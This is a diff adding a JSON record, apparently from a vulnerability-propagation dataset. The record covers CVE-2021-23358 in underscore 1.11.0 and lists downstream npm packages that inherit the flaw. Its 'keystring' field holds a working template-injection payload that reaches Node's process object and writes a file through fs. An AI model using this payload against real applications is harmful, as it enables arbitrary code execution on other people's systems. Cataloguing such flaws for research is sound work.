@@ -1,0 +1,31 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.11.0",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "i2c@0.2.5",
+    "obojobo-document-engine@10.2.0-alpha2",
+    "@abandonware/i2c@0.2.4-3",
+    "shequfe-webfonts-generator@0.5.0",
+    "@danielesalatti/node-redis-distributed-timer@0.0.5",
+    "botlib@1.7.0",
+    "@yoctol/webpack-version-file-plugin@0.1.0",
+    "@sofie-automation/blueprints-integration@1.16.0",
+    "@commercelayer/active-resource@1.0.0-beta.12",
+    "express-client-validator@1.1.0",
+    "tv-automation-sofie-blueprints-integration@2.4.0",
+    "lnurl@0.10.0",
+    "node-ansible-control@0.6.0",
+    "node-webaudioapi-es6@1.0.0",
+    "download.jqueryui.com@2.1.22",
+    "rate-limit-mongo@2.3.0",
+    "pa11y-webservice@3.2.0",
+    "objecdiff@1.1.4",
+    "backblaze-b2-client@0.0.100",
+    "@nsidc/soac-webapp@2.1.1",
+    "zd-i2c@0.2.5",
+    "@alessio.filippucci/admin-dashboard-core@0.0.0-development"
+  ]
+}
